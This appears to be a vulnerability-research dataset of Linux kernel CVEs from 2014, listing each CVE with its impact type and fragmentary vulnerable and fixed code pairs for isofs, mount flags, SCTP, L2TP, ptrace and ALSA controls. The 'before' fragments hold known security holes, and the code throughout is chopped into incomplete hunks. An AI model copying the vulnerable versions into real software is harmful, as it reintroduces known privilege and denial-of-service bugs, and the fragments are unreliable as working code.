struct inode *isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset)

{
 unsigned long hashval;
 struct inode *inode;
 return ERR_PTR(-ENOMEM);

 if (inode->i_state & I_NEW) {
		ret = isofs_read_inode(inode);
 if (ret < 0) {
 iget_failed(inode);
			inode = ERR_PTR(ret);

struct inode;		/* To make gcc happy */

extern int parse_rock_ridge_inode(struct iso_directory_record *, struct inode *);
extern int get_rock_ridge_filename(struct iso_directory_record *, char *, struct inode *);
extern int isofs_name_translate(struct iso_directory_record *, char *, struct inode *);

extern struct buffer_head *isofs_bread(struct inode *, sector_t);
extern int isofs_get_blocks(struct inode *, sector_t, struct buffer_head **, unsigned long);

extern struct inode *isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset);
















/* Because the inode number is no longer relevant to finding the
 * underlying meta-data for an inode, we are free to choose a more
 goto out;
}




static int
parse_rock_ridge_inode_internal(struct iso_directory_record *de,
 struct inode *inode, int regard_xa)
{
 int symlink_len = 0;
 int cnt, sig;

 struct inode *reloc;
 struct rock_ridge *rr;
 int rootflag;

 init_rock_state(&rs, inode);
 setup_rock_ridge(de, inode, &rs);
 if (regard_xa) {
		rs.chr += 14;
		rs.len -= 14;
 if (rs.len < 0)
 ""relocated directory\n"");
 goto out;
 case SIG('C', 'L'):
 ISOFS_I(inode)->i_first_extent =
 isonum_733(rr->u.CL.location);
			reloc =
 isofs_iget(inode->i_sb,
 ISOFS_I(inode)->i_first_extent,
 0);










 if (IS_ERR(reloc)) {
				ret = PTR_ERR(reloc);
 goto out;
 return rpnt;
}

int parse_rock_ridge_inode(struct iso_directory_record *de, struct inode *inode)

{
 int result = parse_rock_ridge_inode_internal(de, inode, 0);


 /*
	 * if rockridge flag was reset and we didn't look for attributes
	 * behind eventual XA attributes, have a look there
 */
 if ((ISOFS_SB(inode->i_sb)->s_rock_offset == -1)
	    && (ISOFS_SB(inode->i_sb)->s_rock == 2)) {
		result = parse_rock_ridge_inode_internal(de, inode, 14);

	}
 return result;
}
"," return;
}

static int isofs_read_inode(struct inode *, int relocated);
static int isofs_statfs (struct dentry *, struct kstatfs *);

static struct kmem_cache *isofs_inode_cachep;
 goto out;
}

static int isofs_read_inode(struct inode *inode, int relocated)
{
 struct super_block *sb = inode->i_sb;
 struct isofs_sb_info *sbi = ISOFS_SB(sb);
 */

 if (!high_sierra) {
 parse_rock_ridge_inode(de, inode, relocated);
 /* if we want uid/gid set, override the rock ridge setting */
 if (sbi->s_uid_set)
			inode->i_uid = sbi->s_uid;
 * offset that point to the underlying meta-data for the inode.  The
 * code below is otherwise similar to the iget() code in
 * include/linux/fs.h */
struct inode *__isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset,
 int relocated)
{
 unsigned long hashval;
 struct inode *inode;
 return ERR_PTR(-ENOMEM);

 if (inode->i_state & I_NEW) {
		ret = isofs_read_inode(inode, relocated);
 if (ret < 0) {
 iget_failed(inode);
			inode = ERR_PTR(ret);

struct inode;		/* To make gcc happy */

extern int parse_rock_ridge_inode(struct iso_directory_record *, struct inode *, int relocated);
extern int get_rock_ridge_filename(struct iso_directory_record *, char *, struct inode *);
extern int isofs_name_translate(struct iso_directory_record *, char *, struct inode *);

extern struct buffer_head *isofs_bread(struct inode *, sector_t);
extern int isofs_get_blocks(struct inode *, sector_t, struct buffer_head **, unsigned long);

struct inode *__isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset,
 int relocated);

static inline struct inode *isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset)
{
 return __isofs_iget(sb, block, offset, 0);
}

static inline struct inode *isofs_iget_reloc(struct super_block *sb,
 unsigned long block,
 unsigned long offset)
{
 return __isofs_iget(sb, block, offset, 1);
}

/* Because the inode number is no longer relevant to finding the
 * underlying meta-data for an inode, we are free to choose a more
 goto out;
}

#define RR_REGARD_XA 1
#define RR_RELOC_DE 2

static int
parse_rock_ridge_inode_internal(struct iso_directory_record *de,
 struct inode *inode, int flags)
{
 int symlink_len = 0;
 int cnt, sig;
 unsigned int reloc_block;
 struct inode *reloc;
 struct rock_ridge *rr;
 int rootflag;

 init_rock_state(&rs, inode);
 setup_rock_ridge(de, inode, &rs);
 if (flags & RR_REGARD_XA) {
		rs.chr += 14;
		rs.len -= 14;
 if (rs.len < 0)
 ""relocated directory\n"");
 goto out;
 case SIG('C', 'L'):
 if (flags & RR_RELOC_DE) {
 printk(KERN_ERR
 ""ISOFS: Recursive directory relocation ""
 ""is not supported\n"");
 goto eio;
			}
			reloc_block = isonum_733(rr->u.CL.location);
 if (reloc_block == ISOFS_I(inode)->i_iget5_block &&
 ISOFS_I(inode)->i_iget5_offset == 0) {
 printk(KERN_ERR
 ""ISOFS: Directory relocation points to ""
 ""itself\n"");
 goto eio;
			}
 ISOFS_I(inode)->i_first_extent = reloc_block;
			reloc = isofs_iget_reloc(inode->i_sb, reloc_block, 0);
 if (IS_ERR(reloc)) {
				ret = PTR_ERR(reloc);
 goto out;
 return rpnt;
}

int parse_rock_ridge_inode(struct iso_directory_record *de, struct inode *inode,
 int relocated)
{
 int flags = relocated ? RR_RELOC_DE : 0;
 int result = parse_rock_ridge_inode_internal(de, inode, flags);

 /*
	 * if rockridge flag was reset and we didn't look for attributes
	 * behind eventual XA attributes, have a look there
 */
 if ((ISOFS_SB(inode->i_sb)->s_rock_offset == -1)
	    && (ISOFS_SB(inode->i_sb)->s_rock == 2)) {
		result = parse_rock_ridge_inode_internal(de, inode,
							 flags | RR_REGARD_XA);
	}
 return result;
}
"
2014,DoS ,CVE-2014-5471," return;
}

static int isofs_read_inode(struct inode *);
static int isofs_statfs (struct dentry *, struct kstatfs *);

static struct kmem_cache *isofs_inode_cachep;
 goto out;
}

static int isofs_read_inode(struct inode *inode)
{
 struct super_block *sb = inode->i_sb;
 struct isofs_sb_info *sbi = ISOFS_SB(sb);
 */

 if (!high_sierra) {
 parse_rock_ridge_inode(de, inode);
 /* if we want uid/gid set, override the rock ridge setting */
 if (sbi->s_uid_set)
			inode->i_uid = sbi->s_uid;
 * offset that point to the underlying meta-data for the inode.  The
 * code below is otherwise similar to the iget() code in
 * include/linux/fs.h */
struct inode *isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset)

{
 unsigned long hashval;
 struct inode *inode;
 return ERR_PTR(-ENOMEM);

 if (inode->i_state & I_NEW) {
		ret = isofs_read_inode(inode);
 if (ret < 0) {
 iget_failed(inode);
			inode = ERR_PTR(ret);

struct inode;		/* To make gcc happy */

extern int parse_rock_ridge_inode(struct iso_directory_record *, struct inode *);
extern int get_rock_ridge_filename(struct iso_directory_record *, char *, struct inode *);
extern int isofs_name_translate(struct iso_directory_record *, char *, struct inode *);

extern struct buffer_head *isofs_bread(struct inode *, sector_t);
extern int isofs_get_blocks(struct inode *, sector_t, struct buffer_head **, unsigned long);

extern struct inode *isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset);
















/* Because the inode number is no longer relevant to finding the
 * underlying meta-data for an inode, we are free to choose a more
 goto out;
}




static int
parse_rock_ridge_inode_internal(struct iso_directory_record *de,
 struct inode *inode, int regard_xa)
{
 int symlink_len = 0;
 int cnt, sig;

 struct inode *reloc;
 struct rock_ridge *rr;
 int rootflag;

 init_rock_state(&rs, inode);
 setup_rock_ridge(de, inode, &rs);
 if (regard_xa) {
		rs.chr += 14;
		rs.len -= 14;
 if (rs.len < 0)
 ""relocated directory\n"");
 goto out;
 case SIG('C', 'L'):
 ISOFS_I(inode)->i_first_extent =
 isonum_733(rr->u.CL.location);
			reloc =
 isofs_iget(inode->i_sb,
 ISOFS_I(inode)->i_first_extent,
 0);










 if (IS_ERR(reloc)) {
				ret = PTR_ERR(reloc);
 goto out;
 return rpnt;
}

int parse_rock_ridge_inode(struct iso_directory_record *de, struct inode *inode)

{
 int result = parse_rock_ridge_inode_internal(de, inode, 0);


 /*
	 * if rockridge flag was reset and we didn't look for attributes
	 * behind eventual XA attributes, have a look there
 */
 if ((ISOFS_SB(inode->i_sb)->s_rock_offset == -1)
	    && (ISOFS_SB(inode->i_sb)->s_rock == 2)) {
		result = parse_rock_ridge_inode_internal(de, inode, 14);

	}
 return result;
}
"," return;
}

static int isofs_read_inode(struct inode *, int relocated);
static int isofs_statfs (struct dentry *, struct kstatfs *);

static struct kmem_cache *isofs_inode_cachep;
 goto out;
}

static int isofs_read_inode(struct inode *inode, int relocated)
{
 struct super_block *sb = inode->i_sb;
 struct isofs_sb_info *sbi = ISOFS_SB(sb);
 */

 if (!high_sierra) {
 parse_rock_ridge_inode(de, inode, relocated);
 /* if we want uid/gid set, override the rock ridge setting */
 if (sbi->s_uid_set)
			inode->i_uid = sbi->s_uid;
 * offset that point to the underlying meta-data for the inode.  The
 * code below is otherwise similar to the iget() code in
 * include/linux/fs.h */
struct inode *__isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset,
 int relocated)
{
 unsigned long hashval;
 struct inode *inode;
 return ERR_PTR(-ENOMEM);

 if (inode->i_state & I_NEW) {
		ret = isofs_read_inode(inode, relocated);
 if (ret < 0) {
 iget_failed(inode);
			inode = ERR_PTR(ret);

struct inode;		/* To make gcc happy */

extern int parse_rock_ridge_inode(struct iso_directory_record *, struct inode *, int relocated);
extern int get_rock_ridge_filename(struct iso_directory_record *, char *, struct inode *);
extern int isofs_name_translate(struct iso_directory_record *, char *, struct inode *);

extern struct buffer_head *isofs_bread(struct inode *, sector_t);
extern int isofs_get_blocks(struct inode *, sector_t, struct buffer_head **, unsigned long);

struct inode *__isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset,
 int relocated);

static inline struct inode *isofs_iget(struct super_block *sb,
 unsigned long block,
 unsigned long offset)
{
 return __isofs_iget(sb, block, offset, 0);
}

static inline struct inode *isofs_iget_reloc(struct super_block *sb,
 unsigned long block,
 unsigned long offset)
{
 return __isofs_iget(sb, block, offset, 1);
}

/* Because the inode number is no longer relevant to finding the
 * underlying meta-data for an inode, we are free to choose a more
 goto out;
}

#define RR_REGARD_XA 1
#define RR_RELOC_DE 2

static int
parse_rock_ridge_inode_internal(struct iso_directory_record *de,
 struct inode *inode, int flags)
{
 int symlink_len = 0;
 int cnt, sig;
 unsigned int reloc_block;
 struct inode *reloc;
 struct rock_ridge *rr;
 int rootflag;

 init_rock_state(&rs, inode);
 setup_rock_ridge(de, inode, &rs);
 if (flags & RR_REGARD_XA) {
		rs.chr += 14;
		rs.len -= 14;
 if (rs.len < 0)
 ""relocated directory\n"");
 goto out;
 case SIG('C', 'L'):
 if (flags & RR_RELOC_DE) {
 printk(KERN_ERR
 ""ISOFS: Recursive directory relocation ""
 ""is not supported\n"");
 goto eio;
			}
			reloc_block = isonum_733(rr->u.CL.location);
 if (reloc_block == ISOFS_I(inode)->i_iget5_block &&
 ISOFS_I(inode)->i_iget5_offset == 0) {
 printk(KERN_ERR
 ""ISOFS: Directory relocation points to ""
 ""itself\n"");
 goto eio;
			}
 ISOFS_I(inode)->i_first_extent = reloc_block;
			reloc = isofs_iget_reloc(inode->i_sb, reloc_block, 0);
 if (IS_ERR(reloc)) {
				ret = PTR_ERR(reloc);
 goto out;
 return rpnt;
}

int parse_rock_ridge_inode(struct iso_directory_record *de, struct inode *inode,
 int relocated)
{
 int flags = relocated ? RR_RELOC_DE : 0;
 int result = parse_rock_ridge_inode_internal(de, inode, flags);

 /*
	 * if rockridge flag was reset and we didn't look for attributes
	 * behind eventual XA attributes, have a look there
 */
 if ((ISOFS_SB(inode->i_sb)->s_rock_offset == -1)
	    && (ISOFS_SB(inode->i_sb)->s_rock == 2)) {
		result = parse_rock_ridge_inode_internal(de, inode,
							 flags | RR_REGARD_XA);
	}
 return result;
}
"
2015,#NAME?,CVE-2014-5332,,
2014,DoS +Priv ,CVE-2014-5207,"
	mnt->mnt.mnt_flags = old->mnt.mnt_flags & ~(MNT_WRITE_HOLD|MNT_MARKED);
 /* Don't allow unprivileged users to change mount flags */
 if ((flag & CL_UNPRIVILEGED) && (mnt->mnt.mnt_flags & MNT_READONLY))
		mnt->mnt.mnt_flags |= MNT_LOCK_READONLY;














 /* Don't allow unprivileged users to reveal what is under a mount */
 if ((flag & CL_UNPRIVILEGED) && list_empty(&old->mnt_expire))
	    !(mnt_flags & MNT_READONLY)) {
 return -EPERM;
	}

















	err = security_sb_remount(sb, data);
 if (err)
 return err;
 */
 if (!(type->fs_flags & FS_USERNS_DEV_MOUNT)) {
			flags |= MS_NODEV;
			mnt_flags |= MNT_NODEV;
		}
	}

#define MNT_USER_SETTABLE_MASK  (MNT_NOSUID | MNT_NODEV | MNT_NOEXEC \
				 | MNT_NOATIME | MNT_NODIRATIME | MNT_RELATIME \
				 | MNT_READONLY)


#define MNT_INTERNAL_FLAGS (MNT_SHARED | MNT_WRITE_HOLD | MNT_INTERNAL | \
			    MNT_DOOMED | MNT_SYNC_UMOUNT | MNT_MARKED)

#define MNT_INTERNAL 0x4000





#define MNT_LOCK_READONLY 0x400000
#define MNT_LOCKED 0x800000
#define MNT_DOOMED 0x1000000
","
	mnt->mnt.mnt_flags = old->mnt.mnt_flags & ~(MNT_WRITE_HOLD|MNT_MARKED);
 /* Don't allow unprivileged users to change mount flags */
 if (flag & CL_UNPRIVILEGED) {
		mnt->mnt.mnt_flags |= MNT_LOCK_ATIME;

 if (mnt->mnt.mnt_flags & MNT_READONLY)
			mnt->mnt.mnt_flags |= MNT_LOCK_READONLY;

 if (mnt->mnt.mnt_flags & MNT_NODEV)
			mnt->mnt.mnt_flags |= MNT_LOCK_NODEV;

 if (mnt->mnt.mnt_flags & MNT_NOSUID)
			mnt->mnt.mnt_flags |= MNT_LOCK_NOSUID;

 if (mnt->mnt.mnt_flags & MNT_NOEXEC)
			mnt->mnt.mnt_flags |= MNT_LOCK_NOEXEC;
	}

 /* Don't allow unprivileged users to reveal what is under a mount */
 if ((flag & CL_UNPRIVILEGED) && list_empty(&old->mnt_expire))
	    !(mnt_flags & MNT_READONLY)) {
 return -EPERM;
	}
 if ((mnt->mnt.mnt_flags & MNT_LOCK_NODEV) &&
	    !(mnt_flags & MNT_NODEV)) {
 return -EPERM;
	}
 if ((mnt->mnt.mnt_flags & MNT_LOCK_NOSUID) &&
	    !(mnt_flags & MNT_NOSUID)) {
 return -EPERM;
	}
 if ((mnt->mnt.mnt_flags & MNT_LOCK_NOEXEC) &&
	    !(mnt_flags & MNT_NOEXEC)) {
 return -EPERM;
	}
 if ((mnt->mnt.mnt_flags & MNT_LOCK_ATIME) &&
	    ((mnt->mnt.mnt_flags & MNT_ATIME_MASK) != (mnt_flags & MNT_ATIME_MASK))) {
 return -EPERM;
	}

	err = security_sb_remount(sb, data);
 if (err)
 return err;
 */
 if (!(type->fs_flags & FS_USERNS_DEV_MOUNT)) {
			flags |= MS_NODEV;
			mnt_flags |= MNT_NODEV | MNT_LOCK_NODEV;
		}
	}

#define MNT_USER_SETTABLE_MASK  (MNT_NOSUID | MNT_NODEV | MNT_NOEXEC \
				 | MNT_NOATIME | MNT_NODIRATIME | MNT_RELATIME \
				 | MNT_READONLY)
#define MNT_ATIME_MASK (MNT_NOATIME | MNT_NODIRATIME | MNT_RELATIME )

#define MNT_INTERNAL_FLAGS (MNT_SHARED | MNT_WRITE_HOLD | MNT_INTERNAL | \
			    MNT_DOOMED | MNT_SYNC_UMOUNT | MNT_MARKED)

#define MNT_INTERNAL 0x4000

#define MNT_LOCK_ATIME 0x040000
#define MNT_LOCK_NOEXEC 0x080000
#define MNT_LOCK_NOSUID 0x100000
#define MNT_LOCK_NODEV 0x200000
#define MNT_LOCK_READONLY 0x400000
#define MNT_LOCKED 0x800000
#define MNT_DOOMED 0x1000000
"
2014,Bypass ,CVE-2014-5206,"		err = do_remount_sb(sb, flags, data, 0);
 if (!err) {
 lock_mount_hash();
		mnt_flags |= mnt->mnt.mnt_flags & MNT_PROPAGATION_MASK;
		mnt->mnt.mnt_flags = mnt_flags;
 touch_mnt_namespace(mnt->mnt_ns);
 unlock_mount_hash();
 * flag, consider how it interacts with shared mounts.
 */
#define MNT_SHARED_MASK	(MNT_UNBINDABLE)
#define MNT_PROPAGATION_MASK	(MNT_SHARED | MNT_UNBINDABLE)



#define MNT_INTERNAL_FLAGS (MNT_SHARED | MNT_WRITE_HOLD | MNT_INTERNAL | \
			    MNT_DOOMED | MNT_SYNC_UMOUNT | MNT_MARKED)
","		err = do_remount_sb(sb, flags, data, 0);
 if (!err) {
 lock_mount_hash();
		mnt_flags |= mnt->mnt.mnt_flags & ~MNT_USER_SETTABLE_MASK;
		mnt->mnt.mnt_flags = mnt_flags;
 touch_mnt_namespace(mnt->mnt_ns);
 unlock_mount_hash();
 * flag, consider how it interacts with shared mounts.
 */
#define MNT_SHARED_MASK	(MNT_UNBINDABLE)
#define MNT_USER_SETTABLE_MASK  (MNT_NOSUID | MNT_NODEV | MNT_NOEXEC \
				 | MNT_NOATIME | MNT_NODIRATIME | MNT_RELATIME \
				 | MNT_READONLY)

#define MNT_INTERNAL_FLAGS (MNT_SHARED | MNT_WRITE_HOLD | MNT_INTERNAL | \
			    MNT_DOOMED | MNT_SYNC_UMOUNT | MNT_MARKED)
"
2014,DoS ,CVE-2014-5077,"	asoc->c = new->c;
	asoc->peer.rwnd = new->peer.rwnd;
	asoc->peer.sack_needed = new->peer.sack_needed;

	asoc->peer.i = new->peer.i;
 sctp_tsnmap_init(&asoc->peer.tsn_map, SCTP_TSN_MAP_INITIAL,
			 asoc->peer.i.initial_tsn, GFP_ATOMIC);
","	asoc->c = new->c;
	asoc->peer.rwnd = new->peer.rwnd;
	asoc->peer.sack_needed = new->peer.sack_needed;
	asoc->peer.auth_capable = new->peer.auth_capable;
	asoc->peer.i = new->peer.i;
 sctp_tsnmap_init(&asoc->peer.tsn_map, SCTP_TSN_MAP_INITIAL,
			 asoc->peer.i.initial_tsn, GFP_ATOMIC);
"
2014,DoS ,CVE-2014-5045," goto out;
	}
	path->dentry = dentry;
	path->mnt = mntget(nd->path.mnt);
 if (should_follow_link(dentry, nd->flags & LOOKUP_FOLLOW))
 return 1;

 follow_mount(path);
	error = 0;
out:
"," goto out;
	}
	path->dentry = dentry;
	path->mnt = nd->path.mnt;
 if (should_follow_link(dentry, nd->flags & LOOKUP_FOLLOW))
 return 1;
 mntget(path->mnt);
 follow_mount(path);
	error = 0;
out:
"
2014,#NAME?,CVE-2014-4943," int err;

 if (level != SOL_PPPOL2TP)
 return udp_prot.setsockopt(sk, level, optname, optval, optlen);

 if (optlen < sizeof(int))
 return -EINVAL;
 struct pppol2tp_session *ps;

 if (level != SOL_PPPOL2TP)
 return udp_prot.getsockopt(sk, level, optname, optval, optlen);

 if (get_user(len, optlen))
 return -EFAULT;
"," int err;

 if (level != SOL_PPPOL2TP)
 return -EINVAL;

 if (optlen < sizeof(int))
 return -EINVAL;
 struct pppol2tp_session *ps;

 if (level != SOL_PPPOL2TP)
 return -EINVAL;

 if (get_user(len, optlen))
 return -EFAULT;
"
2014,DoS +Priv ,CVE-2014-4699,"
#define ARCH_HAS_USER_SINGLE_STEP_INFO

















struct user_desc;
extern int do_get_thread_area(struct task_struct *p, int idx,
 struct user_desc __user *info);
 * calling arch_ptrace_stop() when it would be superfluous.  For example,
 * if the thread has not been back to user mode since the last stop, the
 * thread state might indicate that nothing needs to be done.



 */
#define arch_ptrace_stop_needed(code, info)	(0)
#endif
","
#define ARCH_HAS_USER_SINGLE_STEP_INFO

/*
 * When hitting ptrace_stop(), we cannot return using SYSRET because
 * that does not restore the full CPU state, only a minimal set.  The
 * ptracer can change arbitrary register values, which is usually okay
 * because the usual ptrace stops run off the signal delivery path which
 * forces IRET; however, ptrace_event() stops happen in arbitrary places
 * in the kernel and don't force IRET path.
 *
 * So force IRET path after a ptrace stop.
 */
#define arch_ptrace_stop_needed(code, info)				\
({									\
 set_thread_flag(TIF_NOTIFY_RESUME);				\
 false;								\
})

struct user_desc;
extern int do_get_thread_area(struct task_struct *p, int idx,
 struct user_desc __user *info);
 * calling arch_ptrace_stop() when it would be superfluous.  For example,
 * if the thread has not been back to user mode since the last stop, the
 * thread state might indicate that nothing needs to be done.
 *
 * This is guaranteed to be invoked once before a task stops for ptrace and
 * may include arch-specific operations necessary prior to a ptrace stop.
 */
#define arch_ptrace_stop_needed(code, info)	(0)
#endif
"
2014,DoS ,CVE-2014-4667," /* Only real associations count against the endpoint, so
	 * don't bother for if this is a temporary association.
 */
 if (!asoc->temp) {
 list_del(&asoc->asocs);

 /* Decrement the backlog value for a TCP-style listening
"," /* Only real associations count against the endpoint, so
	 * don't bother for if this is a temporary association.
 */
 if (!list_empty(&asoc->asocs)) {
 list_del(&asoc->asocs);

 /* Decrement the backlog value for a TCP-style listening
"
2014,DoS Overflow ,CVE-2014-4656,"{
 struct snd_kcontrol *kctl;





 list_for_each_entry(kctl, &card->controls, list) {
 if (kctl->id.numid < card->last_numid + 1 + count &&
		    kctl->id.numid + kctl->count > card->last_numid + 1) {
","{
 struct snd_kcontrol *kctl;

 /* Make sure that the ids assigned to the control do not wrap around */
 if (card->last_numid >= UINT_MAX - count)
		card->last_numid = 0;

 list_for_each_entry(kctl, &card->controls, list) {
 if (kctl->id.numid < card->last_numid + 1 + count &&
		    kctl->id.numid + kctl->count > card->last_numid + 1) {
"
2014,DoS Overflow Bypass ,CVE-2014-4655," struct user_element *ue;
 int idx, err;

 if (!replace && card->user_ctl_count >= MAX_USER_CONTROLS)
 return -ENOMEM;
 if (info->count < 1)
 return -EINVAL;
 access = info->access == 0 ? SNDRV_CTL_ELEM_ACCESS_READWRITE :
				 SNDRV_CTL_ELEM_ACCESS_TLV_READWRITE));
	info->id.numid = 0;
 memset(&kctl, 0, sizeof(kctl));
 down_write(&card->controls_rwsem);
	_kctl = snd_ctl_find_id(card, &info->id);
	err = 0;
 if (_kctl) {
 if (replace)
			err = snd_ctl_remove(card, _kctl);
 else
			err = -EBUSY;
	} else {
 if (replace)
			err = -ENOENT;
	}
 up_write(&card->controls_rwsem);
 if (err < 0)
 return err;

 memcpy(&kctl.id, &info->id, sizeof(info->id));
	kctl.count = info->owner ? info->owner : 1;
 access |= SNDRV_CTL_ELEM_ACCESS_USER;
"," struct user_element *ue;
 int idx, err;



 if (info->count < 1)
 return -EINVAL;
 access = info->access == 0 ? SNDRV_CTL_ELEM_ACCESS_READWRITE :
				 SNDRV_CTL_ELEM_ACCESS_TLV_READWRITE));
	info->id.numid = 0;
 memset(&kctl, 0, sizeof(kctl));

 if (replace) {
		err = snd_ctl_remove_user_ctl(file, &info->id);
 if (err)
 return err;






	}

 if (card->user_ctl_count >= MAX_USER_CONTROLS)
 return -ENOMEM;

 memcpy(&kctl.id, &info->id, sizeof(info->id));
	kctl.count = info->owner ? info->owner : 1;
 access |= SNDRV_CTL_ELEM_ACCESS_USER;
"
2014,DoS ,CVE-2014-4654," struct user_element *ue;
 int idx, err;

 if (!replace && card->user_ctl_count >= MAX_USER_CONTROLS)
 return -ENOMEM;
 if (info->count < 1)
 return -EINVAL;
 access = info->access == 0 ? SNDRV_CTL_ELEM_ACCESS_READWRITE :
				 SNDRV_CTL_ELEM_ACCESS_TLV_READWRITE));
	info->id.numid = 0;
 memset(&kctl, 0, sizeof(kctl));
 down_write(&card->controls_rwsem);
	_kctl = snd_ctl_find_id(card, &info->id);
	err = 0;
 if (_kctl) {
 if (replace)
			err = snd_ctl_remove(card, _kctl);
 else
			err = -EBUSY;
	} else {
 if (replace)
			err = -ENOENT;
	}
 up_write(&card->controls_rwsem);
 if (err < 0)
 return err;

 memcpy(&kctl.id, &info->id, sizeof(info->id));
	kctl.count = info->owner ? info->owner : 1;
 access |= SNDRV_CTL_ELEM_ACCESS_USER;
"," struct user_element *ue;
 int idx, err;



 if (info->count < 1)
 return -EINVAL;
 access = info->access == 0 ? SNDRV_CTL_ELEM_ACCESS_READWRITE :
				 SNDRV_CTL_ELEM_ACCESS_TLV_READWRITE));
	info->id.numid = 0;
 memset(&kctl, 0, sizeof(kctl));

 if (replace) {
		err = snd_ctl_remove_user_ctl(file, &info->id);
 if (err)
 return err;






	}

 if (card->user_ctl_count >= MAX_USER_CONTROLS)
 return -ENOMEM;

 memcpy(&kctl.id, &info->id, sizeof(info->id));
	kctl.count = info->owner ? info->owner : 1;
 access |= SNDRV_CTL_ELEM_ACCESS_USER;
"
2014,DoS +Info ,CVE-2014-4653,"{
 struct snd_ctl_elem_id id;
 unsigned int idx;

 int err = -EINVAL;

 if (! kcontrol)
	card->controls_count += kcontrol->count;
	kcontrol->id.numid = card->last_numid + 1;
	card->last_numid += kcontrol->count;

 up_write(&card->controls_rwsem);
 for (idx = 0; idx < kcontrol->count; idx++, id.index++, id.numid++)
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);
 return 0;

 bool add_on_replace)
{
 struct snd_ctl_elem_id id;

 unsigned int idx;
 struct snd_kcontrol *old;
 int ret;
	card->controls_count += kcontrol->count;
	kcontrol->id.numid = card->last_numid + 1;
	card->last_numid += kcontrol->count;

 up_write(&card->controls_rwsem);
 for (idx = 0; idx < kcontrol->count; idx++, id.index++, id.numid++)
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);
 return 0;

			result = kctl->put(kctl, control);
		}
 if (result > 0) {

 up_read(&card->controls_rwsem);
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_VALUE,
				       &control->id);
 return 0;
		}
	}
		}
		err = kctl->tlv.c(kctl, op_flag, tlv.length, _tlv->tlv);
 if (err > 0) {

 up_read(&card->controls_rwsem);
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_TLV, &kctl->id);
 return 0;
		}
	} else {
","{
 struct snd_ctl_elem_id id;
 unsigned int idx;
 unsigned int count;
 int err = -EINVAL;

 if (! kcontrol)
	card->controls_count += kcontrol->count;
	kcontrol->id.numid = card->last_numid + 1;
	card->last_numid += kcontrol->count;
	count = kcontrol->count;
 up_write(&card->controls_rwsem);
 for (idx = 0; idx < count; idx++, id.index++, id.numid++)
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);
 return 0;

 bool add_on_replace)
{
 struct snd_ctl_elem_id id;
 unsigned int count;
 unsigned int idx;
 struct snd_kcontrol *old;
 int ret;
	card->controls_count += kcontrol->count;
	kcontrol->id.numid = card->last_numid + 1;
	card->last_numid += kcontrol->count;
	count = kcontrol->count;
 up_write(&card->controls_rwsem);
 for (idx = 0; idx < count; idx++, id.index++, id.numid++)
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);
 return 0;

			result = kctl->put(kctl, control);
		}
 if (result > 0) {
 struct snd_ctl_elem_id id = control->id;
 up_read(&card->controls_rwsem);
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_VALUE, &id);

 return 0;
		}
	}
		}
		err = kctl->tlv.c(kctl, op_flag, tlv.length, _tlv->tlv);
 if (err > 0) {
 struct snd_ctl_elem_id id = kctl->id;
 up_read(&card->controls_rwsem);
 snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_TLV, &id);
 return 0;
		}
	} else {
"
2014,#NAME?,CVE-2014-4652," int user_ctl_count;		/* count of all user controls */
 struct list_head controls;	/* all controls for this card */
 struct list_head ctl_files;	/* active control files */



 struct snd_info_entry *proc_root;	/* root for soundcard specific files */
 struct snd_info_entry *proc_id;	/* the card id */

struct user_element {
 struct snd_ctl_elem_info info;

 void *elem_data;		/* element data */
 unsigned long elem_data_size;	/* size of element data in bytes */
 void *tlv_data;			/* TLV data */
{
 struct user_element *ue = kcontrol->private_data;


 memcpy(&ucontrol->value, ue->elem_data, ue->elem_data_size);

 return 0;
}

{
 int change;
 struct user_element *ue = kcontrol->private_data;


	change = memcmp(&ucontrol->value, ue->elem_data, ue->elem_data_size) != 0;
 if (change)
 memcpy(ue->elem_data, &ucontrol->value, ue->elem_data_size);

 return change;
}

		new_data = memdup_user(tlv, size);
 if (IS_ERR(new_data))
 return PTR_ERR(new_data);

		change = ue->tlv_data_size != size;
 if (!change)
			change = memcmp(ue->tlv_data, new_data, size);
 kfree(ue->tlv_data);
		ue->tlv_data = new_data;
		ue->tlv_data_size = size;

	} else {
 if (! ue->tlv_data_size || ! ue->tlv_data)
 return -ENXIO;
 if (size < ue->tlv_data_size)
 return -ENOSPC;







 if (copy_to_user(tlv, ue->tlv_data, ue->tlv_data_size))
 return -EFAULT;




	}
 return change;
}
	ue = kzalloc(sizeof(struct user_element) + private_size, GFP_KERNEL);
 if (ue == NULL)
 return -ENOMEM;

	ue->info = *info;
	ue->info.access = 0;
	ue->elem_data = (char *)ue + sizeof(*ue);
 INIT_LIST_HEAD(&card->devices);
 init_rwsem(&card->controls_rwsem);
 rwlock_init(&card->ctl_files_rwlock);

 INIT_LIST_HEAD(&card->controls);
 INIT_LIST_HEAD(&card->ctl_files);
 spin_lock_init(&card->files_lock);
"," int user_ctl_count;		/* count of all user controls */
 struct list_head controls;	/* all controls for this card */
 struct list_head ctl_files;	/* active control files */
 struct mutex user_ctl_lock;	/* protects user controls against
					   concurrent access */

 struct snd_info_entry *proc_root;	/* root for soundcard specific files */
 struct snd_info_entry *proc_id;	/* the card id */

struct user_element {
 struct snd_ctl_elem_info info;
 struct snd_card *card;
 void *elem_data;		/* element data */
 unsigned long elem_data_size;	/* size of element data in bytes */
 void *tlv_data;			/* TLV data */
{
 struct user_element *ue = kcontrol->private_data;

 mutex_lock(&ue->card->user_ctl_lock);
 memcpy(&ucontrol->value, ue->elem_data, ue->elem_data_size);
 mutex_unlock(&ue->card->user_ctl_lock);
 return 0;
}

{
 int change;
 struct user_element *ue = kcontrol->private_data;

 mutex_lock(&ue->card->user_ctl_lock);
